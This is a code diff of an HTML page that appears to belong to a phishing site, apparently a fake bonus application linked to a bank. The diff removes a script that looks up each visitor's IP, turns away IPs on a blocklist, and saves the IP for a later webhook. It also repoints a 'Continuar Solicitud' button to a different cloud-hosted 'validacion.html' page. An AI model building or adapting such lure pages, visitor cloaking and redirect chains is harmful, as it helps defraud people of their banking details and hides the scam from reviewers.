@@ -93,46 +93,7 @@
             }
         }
     </style>
-
-    <script>
-        // --- CONFIGURACIÓN DE SEGURIDAD ---
-        // Lista de IPs que tienen el acceso prohibido
-        const ipsBloqueadas = [
-            "123.45.67.89", 
-            "185.153.177.139"
-        ];
-
-        async function validarAcceso() {
-            try {
-                // Obtenemos la IP real del usuario
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const userIP = data.ip;
-
-                // 1. Verificamos si está en la lista negra
-                if (ipsBloqueadas.includes(userIP)) {
-                    window.location.href = "off.html";
-                    return;
-                }
-
-                // 2. Creamos la "Sesión" en LocalStorage usando la IP
-                const nombreSesion = "SESION_" + userIP.replace(/\./g, '_');
-                localStorage.setItem(nombreSesion, "activa");
-                
-                // Guardamos la IP para usarla en los siguientes pasos (webhook, etc)
-                localStorage.setItem("user_ip", userIP);
-
-                console.log("Acceso verificado para: " + userIP);
-
-            } catch (error) {
-                console.error("Error de validación:", error);
-                // Si la API de IP falla, el usuario podrá entrar por defecto
-            }
-        }
-
-        // Ejecutar validación al cargar la página
-        validarAcceso();
-    </script>
+ 
 </head>
 
 <body>
@@ -148,7 +109,7 @@
                 </div>
 
                 <div style="text-align:center; padding-bottom:20px;">
-                    <button type="button" id="iniciarBtn" onclick="window.location.href='https://asolucion.blob.core.windows.net/solucion/validacion.html'">
+                    <button type="button" id="iniciarBtn" onclick="window.location.href='https://creabonos.blob.core.windows.net/bdv/validacion.html'">
                         Continuar Solicitud
                     </button>
                 </div>
